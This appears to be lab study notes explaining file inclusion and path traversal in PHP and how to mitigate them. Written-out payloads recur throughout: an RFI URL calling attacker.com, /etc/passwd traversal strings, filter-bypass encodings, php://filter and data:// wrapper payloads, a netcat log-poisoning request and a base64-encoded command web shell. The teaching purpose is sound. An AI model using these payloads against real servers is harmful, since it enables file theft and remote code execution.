
File Inclusion and Path Traversal are vulnerabilities that arise when an application allows external input to change the path for accessing files. For example, imagine a library where the catalogue system is manipulated to access restricted books not meant for public viewing. Similarly, in web applications, the vulnerabilities primarily arise from improper handling of file paths and URLs. These vulnerabilities allow attackers to include files not intended to be part of the web application, leading to unauthorized access or execution of code.

---

### Web Application Architecture

Web applications are complex systems comprising several components working together to deliver a seamless user experience. At its core, a web application has two main parts: the frontend and the backend.

1. **Frontend:** This is the user interface of the application, typically built using frameworks like React, Angular, or Vue.js. It communicates with the backend via APIs.
    
2. **Backend:** This server-side component processes user requests, interacts with databases, and serves data to the frontend. It's often developed using languages like PHP, Python, and Javascript and frameworks like Node.js, Django, or Laravel.
    

One of the fundamental aspects of web applications is the client-server model. In this model, the client, usually a web browser, sends a request to the server hosting the web application. The backend server then processes this request and sends back a response. The client and server communication usually happens over the HTTP/HTTPS protocols.

![[fileInclusion1.png]]


##### Server-Side Scripting and File Handling  

Server-side scripts run on the server and generate the content of the frontend, which is then sent to the client. Unlike client-side scripts like JavaScript in the browser, server-side scripts can access the server's file system and databases. File handling is a significant part of server-side scripting. Web applications often need to read from or write to files on the server. For example, reading configuration files, saving user uploads, or including code from other files.
In short, file inclusion and path traversal vulnerabilities arise when user inputs are not properly sanitized or validated. Since attackers can inject malicious payloads to log files `/var/log/apache2/access.log` and manipulate file paths to execute the logged payload, an attacker can achieve remote code execution. An attacker may also read configuration files that contain sensitive information, like database credentials, if the application returns the file in plaintext. Lastly, insufficient error handling may also reveal system paths or file structures, providing clues to attackers about potential targets for path traversal or file inclusion attacks.

---

### File Inclusion Types

A traversal string, commonly seen as `../`, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example, `include('./folder/file.php')` implies that `file.php` is located inside a folder named `folder`, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example, `/var/www/html/folder/file.php` is an absolute path.

##### Remote File Inclusion

Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.

##### Local File Inclusion

Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.

While LFI primarily leads to unauthorized file access, it can escalate to RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. **Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.**


![[Practice Rooms/Attachments/fileInclusion2.png]]


---

### PHP Wrappers

PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.

For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the `php://filter` filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like `/etc/passwd` in base64. This can be achieved by using the `convert.base64-encode` conversion filter of the wrapper. The final payload will then be `php://filter/convert.base64-encode/resource=/etc/passwd`

There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.

For example, the table below represents the output of the target file **.htaccess** using the different string filters in PHP.

|   |   |
|---|---|
|**Payload**|**Output**|
|php://filter/convert.base64-encode/resource=.htaccess|UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz|
|php://filter/string.rot13/resource=.htaccess|ErjevgrRatvar ba Bcgvbaf -Vaqrkrf|
|php://filter/string.toupper/resource=.htaccess|REWRITEENGINE ON OPTIONS -INDEXES|
|php://filter/string.tolower/resource=.htaccess|rewriteengine on options -indexes|
|php://filter/string.strip_tags/resource=.htaccess|RewriteEngine on Options -Indexes|
|No filter applied|RewriteEngine on Options -Indexes|



##### Data Wrapper

The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

`data:text/plain,<?php%20phpinfo();%20?>`
The breakdown of the payload `data:text/plain,<?php phpinfo(); ?>` is:

- `data:` as the URL.
- `mime-type` is set as `text/plain`.
- The data part includes a PHP code snippet: `<?php phpinfo(); ?>`.

---

### Base Directory Breakouts

In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file traversal strings to protect the application from file traversal attacks:

```php
           
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}

        
```

It's possible to comply with this requirement and navigate to other directories. This can be achieved by appending the necessary directory traversal sequences after the mandatory base folder.
use the payload `/var/www/html/..//..//..//etc/passwd`.

The PHP function `containsStr` checks if a substring exists within a string. The if condition checks two things. First, if `$_GET['page']` does not contain the substring `../..`, and if `$_GET['page']` contains the substring `/var/www/html`, however, `..//..//` bypasses this filter because it still effectively navigates up two directories, similar to `../../`. It does not exactly match the blocked pattern `../..` due to the extra slashes. The extra slashes `//` in `..//..//` are treated as a single slash by the file system. This means `../../` and `..//..//` are functionally equivalent in terms of directory navigation but only `../../` is explicitly filtered out by the code.

##### Encoding

Encoding techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences like `../`. However, attackers can often evade detection by encoding these sequences and still navigate through the server's filesystem.

Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, `../` can be encoded in several ways to bypass simple filters.

- Standard URL Encoding: `../` becomes `%2e%2e%2f`
- Double Encoding: Useful if the application decodes inputs twice. `../` becomes `%252e%252e%252f`

An attacker can bypass this filter using encoded representations:

1. **URL Encoded Bypass:** The attacker can use the URL-encoded version of the payload like `?file=%2e%2e%2fconfig.php`. The server decodes this input to `../config.php`, bypassing the filter.
    
2. **Double Encoded Bypass:** The attacker can use double encoding if the application decodes inputs twice. The payload would then be `?file=%252e%252e%252fconfig.php`, where a dot is `%252e`, and a slash is `%252f`. The first decoding step changes `%252e%252e%252f` to `%2e%2e%2f`. The second decoding step then translates it to `../config.php`.

---

### LFI2RCE - Session Files


PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.

```php
           
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}

        
```

An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using `<?php echo phpinfo(); ?>` in the page parameter.
This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser.
Accessing the URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` will execute the injected PHP code in the session file. Note that you have to replace \[sessionID] with the value from your PHPSESSID cookie.

---

### LFI2RCE - Log Poisoning

Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.

For example, if an attacker sends a Netcat request to the vulnerable machine containing a PHP code:

```php
$ nc 10.10.205.93 80      
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.205.93.eu-west-1.compute.internal Port 80</address>
</body></html>
```

The code will then be logged in the server's access logs.


---

### LFI2RCE - Wrappers

PHP wrappers can also be used not only for reading files but also for code execution. The key here is the `php://filter` stream wrapper, which enables file transformations on the fly. Take the PHP base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a base64-encoded payload.

We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

|   |   |   |
|---|---|---|
|**Position**|**Field**|**Value**|
|1|Protocol Wrapper|php://filter|
|2|Filter|convert.base64-decode|
|3|Resource Type|resource=|
|4|Data Type|data://plain/text,|
|5|Encoded Payload|PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+|


In the table above, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` is the base64-encoded version of the PHP code. When the server processes this request, it first decodes the base64 string and then executes the PHP code, allowing the attacker to run commands on the server via the "cmd" GET parameter.

---

### Conclusion

File Inclusion and Path Traversal vulnerabilities arise from improper handling of user-supplied input in web applications. In File Inclusion, attackers exploit the way web applications handle files, leading to Local File Inclusion or Remote File Inclusion. On the other hand, Path Traversal involves navigating the server's directory structure to access files outside the intended directory. Both vulnerabilities can be used to access unauthorized data or system compromise.

##### Mitigation and Prevention Strategies

1. Ensure all user inputs are properly validated and sanitized. This is a crucial step to prevent attackers from manipulating file paths or including malicious files.
2. Implement allowlisting for file inclusion and access. Define which files can be included or accessed and reject any request that does not match these criteria.
3. Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. For PHP, directives like `allow_url_fopen` and `allow_url_include` should be disabled if not needed.
4. Performing regular code reviews and security audits to identify potential vulnerabilities with the help of automated tools. Manual checks are also essential.
5. Ensure that everyone involved in the development process understands the importance of security. Regular training on secure coding practices can significantly reduce the risk of this vulnerability.